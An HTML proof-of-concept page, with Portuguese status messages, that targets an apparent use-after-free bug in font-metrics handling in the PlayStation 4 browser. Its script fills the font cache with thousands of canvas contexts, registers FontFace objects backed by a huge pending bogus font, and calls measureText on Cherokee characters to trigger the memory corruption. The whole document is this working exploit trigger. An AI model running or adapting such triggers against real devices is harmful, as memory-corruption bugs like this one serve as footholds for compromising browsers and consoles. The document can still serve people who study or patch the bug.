<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>FontMetrics UAF PoC - PS4</title>
</head>
<body>
<pre id="log">Executando...</pre>
<script>
function log(msg) {
    document.getElementById('log').textContent = msg;
}

try {
    log('Estressando o cache de fontes...');
    const dummies = [];
    for (let i = 0; i < 3500; i++) {
        const canvas = document.createElement('canvas');
        canvas.width = 1;
        canvas.height = 1;
        const dummy = canvas.getContext('2d');
        dummy.font = '10px "dummy' + i + '"';
        dummies.push(dummy);
    }

    const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
    const keepAlive = [];

    for (let attempt = 0; attempt < 2; attempt++) {
        const metricsDonor = new FontFace('metricsDonor' + attempt, pendingFontURL);
        const measured = new FontFace('measured' + attempt, pendingFontURL, { unicodeRange: 'U+13A0-13FF' });
        
        document.fonts.add(metricsDonor);
        document.fonts.add(measured);

        const canvas = document.createElement('canvas');
        canvas.width = 64;
        canvas.height = 64;
        canvas.style.position = 'absolute';
        canvas.style.left = '-9999px';
        document.body.appendChild(canvas);
        
        const context = canvas.getContext('2d');
        context.font = '10px metricsDonor' + attempt + ', measured' + attempt;
        keepAlive.push(metricsDonor, measured, context, canvas);

        log('Medindo texto (Tentativa ' + (attempt + 1) + ')...');
        context.measureText('\u13A0\u13A2\u13A4');
    }

    log('Teste finalizado.');
} catch (e) {
    log('ERRO: ' + e.message);
}
</script>
</body>
</html>
